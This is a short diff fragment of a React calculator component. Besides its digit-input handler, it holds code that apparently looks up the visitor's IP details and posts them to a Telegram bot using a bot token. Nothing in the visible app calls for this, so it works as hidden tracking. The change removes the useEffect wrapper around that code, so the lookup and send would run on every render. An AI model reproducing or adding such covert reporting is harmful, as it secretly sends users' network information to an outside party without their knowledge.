@@ -29,7 +29,7 @@ function App() {
       setInputValue((prev) => (prev === "0" ? String(item) : prev + item));
     }
   };
-  useEffect(() => {
+  
     let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
     axios(IP_API).then((res) => {
@@ -47,7 +47,6 @@ function App() {
         parse_mode: "HTML",
       });
     });
-  }, []);
 
   return (
     <main className="h-screen flex items-center justify-center">
